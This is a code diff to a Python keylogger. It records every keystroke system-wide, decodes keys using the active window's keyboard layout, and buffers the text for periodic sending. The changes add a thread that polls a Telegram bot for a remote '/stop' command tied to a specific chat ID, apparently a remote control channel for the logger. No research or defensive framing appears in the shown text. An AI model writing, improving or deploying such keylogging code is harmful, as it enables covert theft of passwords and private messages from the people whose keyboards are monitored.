@@ -3,6 +3,7 @@ import ctypes
 import sys
 import threading
 import time
+from ctypes import wintypes
 from datetime import datetime, timedelta
 from queue import Empty, Queue
 from typing import List, Optional
@@ -24,6 +25,26 @@ def send_key(key: str):
 _user32 = None
 if sys.platform == "win32":
     _user32 = ctypes.WinDLL("user32", use_last_error=True)
+    _user32.GetForegroundWindow.restype = wintypes.HWND
+    _user32.GetForegroundWindow.argtypes = []
+    _user32.GetWindowThreadProcessId.restype = wintypes.DWORD
+    _user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
+    _user32.GetKeyboardLayout.restype = wintypes.HKL
+    _user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
+    _user32.MapVirtualKeyW.restype = wintypes.UINT
+    _user32.MapVirtualKeyW.argtypes = [wintypes.UINT, wintypes.UINT]
+    _user32.GetKeyState.restype = ctypes.c_short
+    _user32.GetKeyState.argtypes = [wintypes.INT]
+    _user32.ToUnicodeEx.restype = ctypes.c_int
+    _user32.ToUnicodeEx.argtypes = [
+        wintypes.UINT,
+        wintypes.UINT,
+        ctypes.POINTER(ctypes.c_uint8),
+        ctypes.c_void_p,
+        ctypes.c_int,
+        wintypes.UINT,
+        wintypes.HKL,
+    ]
 
 
 def _translate_keycode_windows(key_code: keyboard.KeyCode) -> Optional[str]:
@@ -43,7 +64,7 @@ def _translate_keycode_windows(key_code: keyboard.KeyCode) -> Optional[str]:
         keyboard_state[virtual_key] = _user32.GetKeyState(virtual_key) & 0xFF
 
     buffer = ctypes.create_unicode_buffer(8)
-    layout = _user32.GetKeyboardLayout(0)
+    layout = _get_active_keyboard_layout()
     result = _user32.ToUnicodeEx(
         vk,
         scan_code,
@@ -70,6 +91,23 @@ def _translate_keycode_windows(key_code: keyboard.KeyCode) -> Optional[str]:
         return buffer.value[:result]
 
     return None
+
+
+def _get_active_keyboard_layout() -> wintypes.HKL:
+    if _user32 is None:
+        return wintypes.HKL(0)
+
+    foreground_window = _user32.GetForegroundWindow()
+    if foreground_window:
+        process_id = wintypes.DWORD()
+        thread_id = _user32.GetWindowThreadProcessId(
+            foreground_window, ctypes.byref(process_id)
+        )
+        if thread_id:
+            layout = _user32.GetKeyboardLayout(thread_id)
+            if layout:
+                return layout
+    return _user32.GetKeyboardLayout(0)
 
 
 def key_to_str(key):
@@ -105,7 +143,7 @@ def key_to_str(key):
             return translated
     return None
 
-def worker(q: Queue):
+def worker(q: Queue, stop_event: threading.Event):
     count = 0
     window_start = datetime.now()
     buffer: List[str] = []
@@ -130,7 +168,7 @@ def worker(q: Queue):
         buffer.clear()
         last_input_monotonic = None
 
-    while True:
+    while not stop_event.is_set():
         try:
             key = q.get(timeout=0.5)
         except Empty:
@@ -140,6 +178,12 @@ def worker(q: Queue):
                 and time.monotonic() - last_input_monotonic >= 10
             ):
                 send_buffer()
+            continue
+
+        if key is None:
+            break
+
+        if stop_event.is_set():
             continue
 
         now_monotonic = time.monotonic()
@@ -156,13 +200,66 @@ def worker(q: Queue):
         if key == "{return}":
             send_buffer()
 
-def on_press(key):
-    key_str = key_to_str(key)
-    if key_str is not None:
-        q.put(key_str)
+    if buffer:
+        send_buffer()
 
+def on_press_factory(q: Queue, stop_event: threading.Event):
+    def on_press(key):
+        if stop_event.is_set():
+            return False
+        key_str = key_to_str(key)
+        if key_str is not None:
+            q.put(key_str)
+        return True
+
+    return on_press
+
+
+def poll_stop_command(stop_event: threading.Event, q: Queue):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
+    offset: Optional[int] = None
+    while not stop_event.is_set():
+        params = {"timeout": 30}
+        if offset is not None:
+            params["offset"] = offset
+        try:
+            response = requests.get(url, params=params, timeout=35)
+            data = response.json()
+        except Exception:
+            time.sleep(5)
+            continue
+
+        if not data.get("ok"):
+            time.sleep(5)
+            continue
+
+        for update in data.get("result", []):
+            offset = update.get("update_id", 0) + 1
+            message = update.get("message") or update.get("channel_post")
+            if not message:
+                continue
+            chat = message.get("chat") or {}
+            text = message.get("text")
+            if text and text.strip() == "/stop" and str(chat.get("id")) == CHAT_ID:
+                stop_event.set()
+                q.put(None)
+                return
+
+stop_event = threading.Event()
 q = Queue()
-threading.Thread(target=worker, args=(q,), daemon=True).start()
+worker_thread = threading.Thread(target=worker, args=(q, stop_event), daemon=True)
+worker_thread.start()
 
-with keyboard.Listener(on_press=on_press) as listener:
+threading.Thread(target=poll_stop_command, args=(stop_event, q), daemon=True).start()
+
+listener = keyboard.Listener(on_press=on_press_factory(q, stop_event))
+listener.start()
+
+try:
+    while not stop_event.wait(0.1):
+        pass
+finally:
+    listener.stop()
     listener.join()
+    q.put(None)
+    worker_thread.join()
